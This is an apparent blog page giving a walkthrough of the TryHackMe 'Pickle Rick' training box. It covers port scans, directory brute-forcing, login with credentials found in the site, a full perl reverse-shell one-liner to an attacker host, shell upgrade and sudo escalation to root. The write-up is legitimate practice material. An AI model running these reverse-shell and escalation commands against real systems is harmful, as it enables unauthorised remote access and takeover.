@@ -1,0 +1,135 @@
+<!doctype html><html lang=en>
+<head>
+<meta charset=utf-8>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<meta http-equiv=content-language content="en">
+<meta name=color-scheme content="light dark">
+<meta http-equiv=content-security-policy content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self'; child-src 'self'; font-src 'self' https://fonts.gstatic.com https://cdn.jsdelivr.net/; form-action 'self'; frame-src 'self'; img-src 'self'; object-src 'none'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com/ https://cdn.jsdelivr.net/; script-src 'self' 'unsafe-inline' https://www.google-analytics.com; prefetch-src 'self'; connect-src 'self' https://www.google-analytics.com;">
+<meta name=author content="Kiel Vaughn">
+<meta name=description content="Pickle Rick is an easy rated difficulty box on TryHackMe. Below are the steps taken to root this box.
+First, I enumerated the open TCP ports with threader3000.
+Next, I enumerated the ports with nmap -A -p 22,80 [machine ip].
+It appears there is a website running on port 80. I visited the site to see what I could find.
+It appears you are looking for ingredients for a recipe, and need to log into the victim computer to find them.">
+<meta name=keywords content="blog,cybersecurity,personal">
+<meta name=twitter:card content="summary">
+<meta name=twitter:title content="Pickle Rick - TryHackMe">
+<meta name=twitter:description content="Pickle Rick is an easy rated difficulty box on TryHackMe. Below are the steps taken to root this box.
+First, I enumerated the open TCP ports with threader3000.
+Next, I enumerated the ports with nmap -A -p 22,80 [machine ip].
+It appears there is a website running on port 80. I visited the site to see what I could find.
+It appears you are looking for ingredients for a recipe, and need to log into the victim computer to find them.">
+<meta property="og:title" content="Pickle Rick - TryHackMe">
+<meta property="og:description" content="Pickle Rick is an easy rated difficulty box on TryHackMe. Below are the steps taken to root this box.
+First, I enumerated the open TCP ports with threader3000.
+Next, I enumerated the ports with nmap -A -p 22,80 [machine ip].
+It appears there is a website running on port 80. I visited the site to see what I could find.
+It appears you are looking for ingredients for a recipe, and need to log into the victim computer to find them.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="http://www.kielvaughn.com/ctfs/2020-07-26-pickle-rick/"><meta property="article:section" content="ctfs">
+<meta property="article:published_time" content="2020-07-26T00:00:00+00:00">
+<meta property="article:modified_time" content="2020-07-26T00:00:00+00:00">
+<title>
+Pickle Rick - TryHackMe · Kiel Vaughn, CISSP
+</title>
+<link rel=canonical href=http://www.kielvaughn.com/ctfs/2020-07-26-pickle-rick/>
+<link rel=preload href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as=font type=font/woff2 crossorigin>
+<link rel=stylesheet href=/css/coder.min.708686f8ab8176e91d44fcbe488a0fe0333b94f405cf18a52383d67ba22f0ccb.css integrity="sha256-cIaG+KuBdukdRPy+SIoP4DM7lPQFzxilI4PWe6IvDMs=" crossorigin=anonymous media=screen>
+<link rel=stylesheet href=/css/coder-dark.min.aa883b9ce35a8ff4a2a5008619005175e842bb18a8a9f9cc2bbcf44dab2d91fa.css integrity="sha256-qog7nONaj/SipQCGGQBRdehCuxioqfnMK7z0Tastkfo=" crossorigin=anonymous media=screen>
+<link rel=icon type=image/png href=/assets/img/cissp.ico sizes=32x32>
+<link rel=icon type=image/png href=/assets/img/cissp.ico sizes=16x16>
+<link rel=apple-touch-icon href=/assets/img/cissp.ico>
+<link rel=apple-touch-icon sizes=180x180 href=/assets/img/cissp.ico>
+<meta name=generator content="Hugo 0.88.1">
+</head>
+<body class="preload-transitions colorscheme-dark">
+<main class=wrapper>
+<nav class=navigation>
+<section class=container>
+<a class=navigation-title href=/>
+Kiel Vaughn, CISSP
+</a>
+<input type=checkbox id=menu-toggle>
+<label class="menu-button float-right" for=menu-toggle>
+<i class="fa fa-bars fa-fw" aria-hidden=true></i>
+</label>
+<ul class=navigation-list>
+<li class=navigation-item>
+<a class=navigation-link href=/whoami/>whoami</a>
+</li>
+<li class=navigation-item>
+<a class=navigation-link href=/certifications/>certifications</a>
+</li>
+<li class=navigation-item>
+<a class=navigation-link href=/posts/>blog</a>
+</li>
+<li class=navigation-item>
+<a class=navigation-link href=/ctfs/>vulnerable machine walkthroughs</a>
+</li>
+</ul>
+</section>
+</nav>
+<div class=content>
+<section class="container page">
+<article>
+<header>
+<h1 class=title>
+<a class=title-link href=http://www.kielvaughn.com/ctfs/2020-07-26-pickle-rick/>
+Pickle Rick - TryHackMe
+</a>
+</h1>
+</header>
+<p>Pickle Rick is an easy rated difficulty box on <a href=https://www.tryhackme.com>TryHackMe</a>. Below are the steps taken to root this box.</p>
+<p>First, I enumerated the open TCP ports with <strong>threader3000</strong>.</p>
+<p><img src=/assets/img/PickleRick1.png alt="Pickle Rick threader3000"></p>
+<p>Next, I enumerated the ports with <strong>nmap -A -p 22,80 [machine ip]</strong>.</p>
+<p><img src=/assets/img/PickleRick2.png alt="Pickle Rick nmap"></p>
+<p>It appears there is a website running on port 80. I visited the site to see what I could find.</p>
+<p><img src=/assets/img/PickleRick3.png alt="Pickle Rick website"></p>
+<p>It appears you are looking for ingredients for a recipe, and need to log into the victim computer to find them. Let&rsquo;s look at the source code of this page. The bolded words of <strong>BURP</strong> are probably a hint that burp suite is needed.</p>
+<p><img src=/assets/img/PickleRick4.png alt="Pickle Rick Source Code username"></p>
+<p>This appears to be a username for something, so let&rsquo;s make a note of it for now. Next, let&rsquo;s enumerate the site with gobuster and see if we can find anything else on this site. The command I ran was <strong>gobuster dir -u http://[machine ip] -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x .php,.txt -t 50</strong></p>
+<p><img src=/assets/img/PickleRick5.png alt="Pickle Rick gobuster"></p>
+<p>We find a few different files/folders. <strong>/assets</strong> contained a couple of javascript files and a few images that we will come back to. The <strong>robots.txt</strong> contains a single word in it.</p>
+<p><img src=/assets/img/PickleRick6.png alt="Pickle Rick robots.txt"></p>
+<p>Let&rsquo;s take a look at <strong>/login.php</strong> (<strong>/portal.php</strong> redirects to <strong>/login.php</strong> as well). It asks for a set of credentials. Let&rsquo;s try the username and potential passwords we uncovered previously.</p>
+<p><img src=/assets/img/PickleRick7.png alt="Pickle Rick portal.php"></p>
+<p>We were able to login successfully and now have a command panel.</p>
+<p><img src=/assets/img/PickleRick8.png alt="Pickle Rick Command Panel"></p>
+<p>Let&rsquo;s run <strong>whoami</strong> and see what happens.</p>
+<p><img src=/assets/img/PickleRick9.png alt="Pickle Rick Command Panel 2"></p>
+<p>It appears we can execute shell commands, let&rsquo;s open up a netcat listener on our attacker pc with <strong>nc -nvlp 4444</strong></p>
+<p><img src=/assets/img/PickleRick10.png alt="Pickle Rick nc listener"></p>
+<p>Next, lets try entering reverse shell one liners (<a href=http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet>found here</a>) until we find one that works. The perl one seemed to work with <strong>perl -e &lsquo;use Socket;$i="[attacker ip]";$p=[attacker port];socket(S,PF_INET,SOCK_STREAM,getprotobyname(&ldquo;tcp&rdquo;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'</strong></p>
+<p><img src=/assets/img/PickleRick11.png alt="Pickle Rick perl reverse shell"></p>
+<p>We should now have a reverse shell established on our attacker PC. Running <strong>whoami</strong> lets you know you&rsquo;re running as <strong>www-data</strong>, and there is a file here that appears to contain the first ingredient.</p>
+<p><img src=/assets/img/PickleRick12.png alt="Pickle Rick www-data shell"></p>
+<p>Let&rsquo;s run <strong>cat Sup3rS3cretPickl3Ingred.txt</strong> and see what is there.</p>
+<p><img src=/assets/img/PickleRick13.png alt="Pickle Rick 1st ingredient"></p>
+<p>This is the answer to the first flag. There is another text file present, lets look at it with <strong>cat clue.txt</strong></p>
+<p><img src=/assets/img/PickleRick14.png alt="Pickle Rick clue.txt"></p>
+<p>Let&rsquo;s take this clue&rsquo;s advise and run <em><em>find / -name &ldquo;second</em>&rdquo; 2>/dev/null</em>*. This will return the location of the 2nd ingredient file.</p>
+<p><img src=/assets/img/PickleRick15.png alt="Pickle Rick 2nd ingredient location"></p>
+<p>Let&rsquo;s run <strong>cat</strong> on the file directory/name above in quotes and see what happens:</p>
+<p><img src=/assets/img/PickleRick16.png alt="Pickle Rick 2nd clue"></p>
+<p>Success, this is the 2nd clue. Let&rsquo;s run <strong>sudo -l</strong> and see if www-data has any privileges we can run as another user.</p>
+<p><img src=/assets/img/PickleRick17.png alt="Pickle Rick sudo -l"></p>
+<p>We can run any command as any user. Before we can swap users to root, we need to upgrade our shell. Let&rsquo;s run <strong>python3 -c &lsquo;import pty; pty.spawn("/bin/sh")&rsquo;.</strong></p>
+<p><img src=/assets/img/PickleRick18.png alt="Pickle Rick shell upgrade python3"></p>
+<p>Let&rsquo;s run <strong>sudo su</strong> to switch to root and then <strong>cd /root</strong> followed by <strong>ls -al</strong> to see what&rsquo;s in root&rsquo;s home folder. There&rsquo;s a file called <strong>3rd.txt</strong>. Let&rsquo;s run <strong>cat 3rd.txt</strong> to get the 3rd flag and finish this box.</p>
+<p><img src=/assets/img/PickleRick19.png alt="Pickle Rick 3rd ingredient"></p>
+</article>
+</section>
+</div>
+<footer class=footer>
+<section class=container>
+©
+2020 -
+2021
+Kiel Vaughn
+</section>
+</footer>
+</main>
+<script src=/js/coder.min.03b17769f4f91ae35667e1f2a1ca8c16f50562576cf90ff32b3179926914daa5.js integrity="sha256-A7F3afT5GuNWZ+HyocqMFvUFYlds+Q/zKzF5kmkU2qU="></script>
+</body>
+</html>
